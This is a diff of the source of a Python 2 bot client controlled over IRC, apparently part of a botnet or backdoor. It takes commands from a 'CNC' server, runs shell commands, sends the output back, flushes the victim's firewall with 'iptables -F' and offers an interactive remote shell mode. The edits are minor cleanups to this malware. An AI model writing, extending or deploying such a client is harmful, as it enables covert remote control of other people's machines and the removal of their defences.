@@ -46,7 +46,7 @@ def execute(cmd): #execute shell commands
 	#handling multi-line output
 	lines = output.split("\n")[:-1] #split based on newline, return all except last element which is just a blank new line
 	if len(lines) > 1: #if there was a new line found, return array
-		if isItLs:
+		if isItLs:#doing all the directory stuff
 			dirs = "dirs: "
 			files = "files: "
 			for line in lines:
@@ -56,9 +56,15 @@ def execute(cmd): #execute shell commands
 					files += "'" + line + "'   "
 			lines = [dirs.strip(), files.strip()]
 
+
+		for element in lines:#check if a line is JUST a newline
+			if element == "":
+				lines[lines.index(element)] = "~"#replace newline with a ~
+
 		return lines
 	
 	return output
+
 
 #actually sending the data
 def sendData(data): #send text back to the irc server
@@ -109,13 +115,13 @@ def getIP(): #gets the public IP address
 
 def flushFirewall(): #flushes the firewall rules
 	if (os == "linux"):
-		request = execute("sudo iptables -F") #flushing rules
+		request = execute("iptables -F") #flushing rules
 		sendData("Firewall rules have been flushed.")
 
 def checkFirewall(): #reports current firewall config
 	if (os == "linux"):
 		sendData("Current Firewall Rules:")
-		request = execute("sudo iptables -L -n")
+		request = execute("iptables -L -n")
 		sendData(request)
 	elif (os == "windows"):
 		sendData("idk how to windows yet boss.")
@@ -203,7 +209,7 @@ def parseCommand(command):
 			tempCommand = command[command.index("PRIVMSG"):]
 			command = tempCommand[(tempCommand.index(':') + 1):].strip().lower()
 
-			print "Recieved %s from the CNC" % command #print command
+			print "Recieved '%s' from the CNC" % command #print command
 
 			if INTERACT[0]: #if interactive shell is on
 				if "??finish" == command[:8]:
